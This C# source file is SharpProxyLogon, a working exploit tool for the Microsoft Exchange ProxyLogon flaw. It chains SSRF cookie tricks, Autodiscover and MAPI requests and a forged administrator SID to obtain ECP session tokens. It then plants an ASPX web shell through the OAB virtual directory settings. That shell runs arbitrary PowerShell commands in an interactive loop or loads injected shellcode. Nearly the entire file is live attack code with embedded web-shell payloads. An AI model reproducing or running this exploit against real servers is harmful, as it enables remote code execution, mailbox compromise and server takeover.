using Newtonsoft.Json;
using SharpProxyLogon.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Authentication;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Xml.Linq;

namespace SharpProxyLogon
{
    class Program
    {




        static async Task MainAsync(string[] args)
        {
            string ascii = @"
 __ _                        ___                       __                         
/ _\ |__   __ _ _ __ _ __   / _ \_ __ _____  ___   _  / /  ___   __ _  ___  _ __  
\ \| '_ \ / _` | '__| '_ \ / /_)/ '__/ _ \ \/ / | | |/ /  / _ \ / _` |/ _ \| '_ \ 
_\ \ | | | (_| | |  | |_) / ___/| | | (_) >  <| |_| / /__| (_) | (_| | (_) | | | |
\__/_| |_|\__,_|_|  | .__/\/    |_|  \___/_/\_\\__, \____/\___/ \__, |\___/|_| |_|
                    |_|                        |___/            |___/             
@Flangvik 
";

            Console.WriteLine(ascii);
            Console.WriteLine("Usage Shell: SharpProxyLogon.exe <targetip> <targetemail>");
            Console.WriteLine("Usage x64 injection: SharpProxyLogon.exe <targetip> <targetemail> <shellcodepath.bin> <inject-target-full-path>");
            string shellcodePath = "";
            string injectiontarget = "";
           

            string shellcodeb64 = "";
            string loaderb64 = TikiTorch.ShellcodeLoader;

            bool injection = false;

            string targetServer = args[0];
            string targetEmail = args[1];

            if (args.Count() > 2)
            {
                shellcodePath = args[2];
                injectiontarget = args[3];
              
                injection = true;

                shellcodeb64 = Convert.ToBase64String(File.ReadAllBytes(shellcodePath));

            }

            string randomShellName = Guid.NewGuid().ToString().Replace("-", "");

            string shellPath = "C:\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\owa\\\\auth\\\\" + randomShellName + ".aspx";



            var shell_content = @"<script language=""JScript"" runat=""server""> function Page_Load(){eval(Request[""data""],""unsafe"");}</script>".Replace("\"", @"\""");
            
            if (injection)
                shell_content = @"<Script Language=""C#"" Runat=""Server"">public void Page_Load(){/*hr*/System.Reflection.Assembly.Load(System.Convert.FromBase64String(Request.Form[""a""])).EntryPoint.Invoke(null, new object[]{new string[]{Request.Form[""b""]}});}</script>".Replace("\"", @"\""");

            var autoDiscoverBody = $@"<Autodiscover xmlns=""http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006""><Request><EMailAddress>{targetEmail}</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>";
            string hostname = "";

            var proxy = new WebProxy
            {
                Address = new Uri($"http://127.0.0.1:8080"),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,
            };


            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                UseProxy = true,
                UseCookies = false,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {

                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
            };

            using (var httpClientSSRF = new HttpClient(httpClientHandler))
            {

                //Leak the internal hostname of target
                var leakFDQNReqMsg = new HttpRequestMessage(HttpMethod.Get, $"https://{targetServer}/ecp/{Guid.NewGuid().ToString().Replace("-", "")}.js");

                leakFDQNReqMsg.Headers.Add("Cookie", "X-BEResource=localhost~1942062522");

                var leakFQDNReqResp = await httpClientSSRF.SendAsync(leakFDQNReqMsg);

                leakFQDNReqResp.Headers.TryGetValues("X-FEServer", out var fqdnList);

                if (fqdnList.Count() == 0)
                {
                    Console.WriteLine("[x] Failed to get FQDN");
                    Environment.Exit(0);
                }

                hostname = fqdnList.FirstOrDefault();
                Console.WriteLine($"[+] Got hostname {hostname}");
                //Autodisvery to get target mailboxid
                var autoDiscoverReqMsg = new HttpRequestMessage(
                    HttpMethod.Post,
                    $"https://{targetServer}/ecp/{randomShellName}.js"

                    );
                var autoDiscovercookieContainer = new CookieContainer();

                autoDiscoverReqMsg.Headers.Add("Cookie", $"X-BEResource={hostname}/autodiscover/autodiscover.xml?a=~1942062522;");
                autoDiscoverReqMsg.Content = new StringContent(autoDiscoverBody, Encoding.UTF8, "text/xml");

                var autoDiscoverReqResp = await httpClientSSRF.SendAsync(autoDiscoverReqMsg);
                var autoDiscoverContentResp = await autoDiscoverReqResp.Content.ReadAsStringAsync();

                var legacyDN = autoDiscoverContentResp.Split(new string[] { "<LegacyDN>" }, StringSplitOptions.None)[1].Split(new string[] { "</LegacyDN>" }, StringSplitOptions.None)[0];
                var mailBoxId = autoDiscoverContentResp.Split(new string[] { "<Server>" }, StringSplitOptions.None)[1].Split(new string[] { "</Server>" }, StringSplitOptions.None)[0];

                Console.WriteLine($"[+] Got legacyDN {legacyDN}");
                Console.WriteLine($"[+] Got mailBoxId {mailBoxId}");

                var mapiReqMsg = new HttpRequestMessage(
                    HttpMethod.Post,
                    $"https://{targetServer}/ecp/{Guid.NewGuid().ToString().Replace("-", "")}.js"

                    );
                var mapicookieContainer = new CookieContainer();
                var mapiBody = legacyDN + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00";

                mapiReqMsg.Headers.Add("Cookie", $"X-BEResource=Administrator@{hostname}:444/mapi/emsmdb?MailboxId={mailBoxId}&a=~1942062522;");
                mapiReqMsg.Headers.Add("X-Requesttype", "Connect");
                mapiReqMsg.Headers.Add("X-Clientinfo", Guid.NewGuid().ToString());
                mapiReqMsg.Headers.Add("X-Requestid", Guid.NewGuid().ToString());
                mapiReqMsg.Headers.Add("X-Clientapplication", "Outlook/15.0.4815.1002");

                mapiReqMsg.Content = new StringContent(mapiBody, null, "application/mapi-http");
                mapiReqMsg.Content.Headers.ContentType.CharSet = null;

                var mapiReqResp = await httpClientSSRF.SendAsync(mapiReqMsg);
                var mapiContentResp = await mapiReqResp.Content.ReadAsStringAsync();


                // with SID S-1-5-21-2354578447-2549489838-160590685-500 and MasterAccountSi
                var accountSID = mapiContentResp.Split(new string[] { "with SID " }, StringSplitOptions.None)[1].Split(new string[] { " and MasterAccountSi" }, StringSplitOptions.None)[0];

                var adminSID = accountSID.Replace(accountSID.Split('-')[7], "500");


                Console.WriteLine($"[+] Got accountSID {accountSID}");
                Console.WriteLine($"[+] Patched accountSID-> {adminSID}");

                //ProxyLogon to get Canary token
                var proxyLogonReqMsg = new HttpRequestMessage(
                    HttpMethod.Post,
                    $"https://{targetServer}/ecp/{Guid.NewGuid().ToString().Replace("-", "")}.js"

                    );
                var proxyLogoncookieContainer = new CookieContainer();


                proxyLogonReqMsg.Headers.Add("Cookie",

                    $"X-BEResource=Administrator@{hostname}:444/ecp/proxyLogon.ecp?a=~1942062522;"

                    );
                proxyLogonReqMsg.Headers.Add("msExchLogonAccount", adminSID);
                proxyLogonReqMsg.Headers.Add("msExchLogonMailbox", adminSID);
                proxyLogonReqMsg.Headers.Add("msExchTargetMailbox", adminSID);

                proxyLogonReqMsg.Headers.Add("X-Requesttype", "Connect");
                proxyLogonReqMsg.Headers.Add("X-Clientinfo", Guid.NewGuid().ToString());
                proxyLogonReqMsg.Headers.Add("X-Requestid", Guid.NewGuid().ToString());
                proxyLogonReqMsg.Headers.Add("X-Clientapplication", "Outlook/15.0.4815.1002");

                var proxyLogonBody = $@"<r at=""Negotiate"" ln=""administrator""><s>{adminSID}</s></r>";

                proxyLogonReqMsg.Content = new StringContent(proxyLogonBody, Encoding.UTF8, "text/xml");


                var proxyLogonReqResp = await httpClientSSRF.SendAsync(proxyLogonReqMsg);
                var proxyLogonContentResp = await proxyLogonReqResp.Content.ReadAsStringAsync();

                proxyLogonReqResp.Headers.TryGetValues("Set-Cookie", out var responseCookies);


                var msExchEcpCanary = responseCookies.Where(x => x.StartsWith("msExchEcpCanary=")).FirstOrDefault().Split('=')[1].Split(';')[0];
                var aspNETSessionID = responseCookies.Where(x => x.StartsWith("ASP.NET_SessionId")).FirstOrDefault().Split('=')[1].Split(';')[0];

                Console.WriteLine($"[+] Got msExchEcpCanary {msExchEcpCanary}");
                Console.WriteLine($"[+] Got aspNETSessionID {aspNETSessionID}");

                //ProxyLogon to get Canary token
                var getOABIdReqMsg = new HttpRequestMessage(
                    HttpMethod.Post,
                    $"https://{targetServer}/ecp/{Guid.NewGuid().ToString().Replace("-", "")}.js"

                    );


                getOABIdReqMsg.Headers.Add("Cookie",

                     $"X-BEResource=Administrator@{hostname}:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={aspNETSessionID}; msExchEcpCanary={msExchEcpCanary}"

                     );
                getOABIdReqMsg.Headers.Add("msExchLogonAccount", adminSID);
                getOABIdReqMsg.Headers.Add("msExchLogonMailbox", adminSID);
                getOABIdReqMsg.Headers.Add("msExchTargetMailbox", adminSID);

                //setUNCPathReqMsg.Headers.Add("X-Requesttype", "Connect");
                getOABIdReqMsg.Headers.Add("X-Clientinfo", Guid.NewGuid().ToString());
                getOABIdReqMsg.Headers.Add("X-Requestid", Guid.NewGuid().ToString());
                getOABIdReqMsg.Headers.Add("X-Clientapplication", "Outlook/15.0.4815.1002");

                var getOABIdBody = @"
                    {
                       ""filter"":{
                          ""Parameters"":{
                                        ""__type"":""JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel"",
                             ""SelectedView"":"""",
                             ""SelectedVDirType"":""All""
                          }
                                },
                       ""sort"":{

                                }
                            }
                     ";


                getOABIdReqMsg.Content = new StringContent(getOABIdBody, Encoding.UTF8, "application/json");

                var getOABIdReqResp = await httpClientSSRF.SendAsync(getOABIdReqMsg);
                var getOABIdContentResp = await getOABIdReqResp.Content.ReadAsStringAsync();

             
                var getOABIdJsonObject = JsonConvert.DeserializeObject<GetOABVirutalDirectory>(getOABIdContentResp);
                var OABId = getOABIdJsonObject.d.Output.FirstOrDefault().Identity.RawIdentity;

                Console.WriteLine($"[+] Got OABId {OABId}");


                Console.WriteLine($"[+] Setting ExternalUrl...");

                var setOABURLReqMsg = new HttpRequestMessage(
                    HttpMethod.Post,
                    $"https://{targetServer}/ecp/{Guid.NewGuid().ToString().Replace("-", "")}.js"

                    );


                setOABURLReqMsg.Headers.Add("Cookie",

                     $"X-BEResource=Administrator@{hostname}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={aspNETSessionID}; msExchEcpCanary={msExchEcpCanary}"

                     );
                setOABURLReqMsg.Headers.Add("msExchLogonAccount", adminSID);
                setOABURLReqMsg.Headers.Add("msExchLogonMailbox", adminSID);
                setOABURLReqMsg.Headers.Add("msExchTargetMailbox", adminSID);

                //setUNCPathReqMsg.Headers.Add("X-Requesttype", "Connect");
                setOABURLReqMsg.Headers.Add("X-Clientinfo", Guid.NewGuid().ToString());
                setOABURLReqMsg.Headers.Add("X-Requestid", Guid.NewGuid().ToString());
                setOABURLReqMsg.Headers.Add("X-Clientapplication", "Outlook/15.0.4815.1002");

                var setOABURLBody = @"
              {
   ""identity"":{
      ""__type"":""Identity:ECP"",
      ""DisplayName"":""OAB (Default Web Site)"",
      ""RawIdentity"":""" + OABId + @"""
   },
   ""properties"":{
                ""Parameters"":{
                    ""__type"":""JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel"",
         ""ExternalUrl"":""http://a/#" + shell_content + @"""
                }
            }
        } ";


                setOABURLReqMsg.Content = new StringContent(setOABURLBody, Encoding.UTF8, "application/json");

                var setOABURLReqResp = await httpClientSSRF.SendAsync(setOABURLReqMsg);
                var setOABURLContentResp = await setOABURLReqResp.Content.ReadAsStringAsync();

                Console.WriteLine($"[+] Triggering ResetOABVirtualDirectory...");
                //ProxyLogon to get Canary token
                var resetOABReqMsg = new HttpRequestMessage(
                    HttpMethod.Post,
                    $"https://{targetServer}/ecp/{Guid.NewGuid().ToString().Replace("-", "")}.js"

                    );


                resetOABReqMsg.Headers.Add("Cookie",

                     $"X-BEResource=Administrator@{hostname}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={aspNETSessionID}; msExchEcpCanary={msExchEcpCanary}"

                     );
                resetOABReqMsg.Headers.Add("msExchLogonAccount", adminSID);
                resetOABReqMsg.Headers.Add("msExchLogonMailbox", adminSID);
                resetOABReqMsg.Headers.Add("msExchTargetMailbox", adminSID);

                resetOABReqMsg.Headers.Add("X-Clientinfo", Guid.NewGuid().ToString());
                resetOABReqMsg.Headers.Add("X-Requestid", Guid.NewGuid().ToString());
                resetOABReqMsg.Headers.Add("X-Clientapplication", "Outlook/15.0.4815.1002");

                var resetOABBody = @"
                {
   ""identity"":{
      ""__type"":""Identity:ECP"",
      ""DisplayName"":""OAB (Default Web Site)"",
      ""RawIdentity"":""" + OABId + @"""
   },
   ""properties"":{
                ""Parameters"":{
                    ""__type"":""JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel"",
         ""FilePathName"":""" + shellPath + @"""
                }
            }
        } ";


                resetOABReqMsg.Content = new StringContent(resetOABBody, Encoding.UTF8, "application/json");

                var resetOABReqResp = await httpClientSSRF.SendAsync(resetOABReqMsg);
                var resetOABContentResp = await resetOABReqResp.Content.ReadAsStringAsync();
                Thread.Sleep(2000);
                if (injection)
                {
                    Console.WriteLine($"[+] Shell should have landed, triggering injection");
                    //ProxyLogon to get Canary token
                    var shellReqMsg = new HttpRequestMessage(
                        HttpMethod.Post,
                        $"https://{targetServer}/ecp/{randomShellName}.js");

                    //shellReqMsg.Headers.Add("Host", FQDN);
                    shellReqMsg.Headers.Add("Cookie",

                   $"X-BEResource=Administrator@{hostname}/owa/auth/{randomShellName}.aspx?a=~1942062522; ASP.NET_SessionId={aspNETSessionID}; msExchEcpCanary={msExchEcpCanary}"

                   );
                    shellReqMsg.Headers.Add("msExchLogonAccount", adminSID);
                    shellReqMsg.Headers.Add("msExchLogonMailbox", adminSID);
                    shellReqMsg.Headers.Add("msExchTargetMailbox", adminSID);
                    shellReqMsg.Headers.Add("X-Clientinfo", Guid.NewGuid().ToString());
                    shellReqMsg.Headers.Add("X-Requestid", Guid.NewGuid().ToString());
                    shellReqMsg.Headers.Add("X-Clientapplication", "Outlook/15.0.4815.1002");

                 
                    var Parameters = new List<KeyValuePair<string, string>>
                        {
                           new KeyValuePair<string, string>("a", loaderb64),
                           new KeyValuePair<string, string>("b",  Convert.ToBase64String(Encoding.UTF8.GetBytes(injectiontarget + "-" + shellcodeb64)))
                        };

                    shellReqMsg.Content = new FormUrlEncodedContent(Parameters);

                    var shellReqResp = await httpClientSSRF.SendAsync(shellReqMsg);
                    var shellContentResp = await shellReqResp.Content.ReadAsStringAsync();

                }
                else
                {
                    Console.WriteLine($"[+] Shell should have landed, going semi-interactive");

                    while (true)
                    {

                        Console.Write("CMD #>");
                        var command = Console.ReadLine();

                        //ProxyLogon to get Canary token
                        var shellReqMsg = new HttpRequestMessage(
                            HttpMethod.Post,
                            $"https://{targetServer}/ecp/{Guid.NewGuid().ToString().Replace("-", "")}.js");

                        //shellReqMsg.Headers.Add("Host", FQDN);
                        shellReqMsg.Headers.Add("Cookie",

                       $"X-BEResource=Administrator@{hostname}/owa/auth/{randomShellName}.aspx?a=~1942062522; ASP.NET_SessionId={aspNETSessionID}; msExchEcpCanary={msExchEcpCanary}"

                       );
                        shellReqMsg.Headers.Add("msExchLogonAccount", adminSID);
                        shellReqMsg.Headers.Add("msExchLogonMailbox", adminSID);
                        shellReqMsg.Headers.Add("msExchTargetMailbox", adminSID);

                        //setUNCPathReqMsg.Headers.Add("X-Requesttype", "Connect");
                        shellReqMsg.Headers.Add("X-Clientinfo", Guid.NewGuid().ToString());
                        shellReqMsg.Headers.Add("X-Requestid", Guid.NewGuid().ToString());
                        shellReqMsg.Headers.Add("X-Clientapplication", "Outlook/15.0.4815.1002");

                        var Parameters = new List<KeyValuePair<string, string>>
                        {
                            new KeyValuePair<string, string>("data", $@"Response.Write(new ActiveXObject(""WScript.Shell"").exec(""powershell.exe -command {command}"").stdout.readall());")
                        };

                        shellReqMsg.Content = new FormUrlEncodedContent(Parameters);

                        var shellReqResp = await httpClientSSRF.SendAsync(shellReqMsg);
                        var shellContentResp = await shellReqResp.Content.ReadAsStringAsync();

                        Console.WriteLine(shellContentResp.Split(new string[] { "Name                            :" }, StringSplitOptions.None)[0]);
                    }
                }
            }







        }

        static void Main(string[] args)
        {
            MainAsync(args).GetAwaiter().GetResult();
        }
    }
}
